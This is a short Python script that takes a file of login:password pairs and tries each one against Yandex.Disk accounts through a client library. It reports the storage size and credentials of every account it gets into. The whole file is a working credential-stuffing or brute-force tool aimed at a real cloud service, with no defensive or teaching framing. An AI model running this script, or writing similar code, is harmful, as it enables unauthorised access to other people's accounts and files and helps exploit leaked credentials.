#!/usr/bin/env python3
#
# requirements
# pip3 install hurry.filesiz
# pip3 install YaDiskClient
# 
# example of dictonary.txt
# login1:password1
#
from YaDiskClient.YaDiskClient import YaDisk
from hurry.filesize import size
from optparse import OptionParser

def brute(username, password):
    try:
        disk = YaDisk(username, password)
        a = disk.df()
        print('Summary size: '+ size(int(a['used'])+int(a['available'])) + " Login: " + username + " Password: " + password)
    except:
    	#pass
        print ('Error : ' + username + ' ' + password, end="\r")

def main():
    parser = OptionParser(usage="usage: python3 <program name>.py -p <password file>")
    parser.add_option("-p", type="string",
                      help="Enter password file",
                      dest="passFile")
    (options, args) = parser.parse_args()

    if not options.passFile:
        parser.print_help()
    else:
        with open(options.passFile) as f:
            data = [ line.strip().split(':') for line in f ]

        for username, password in data:
            brute(username, password)

main()
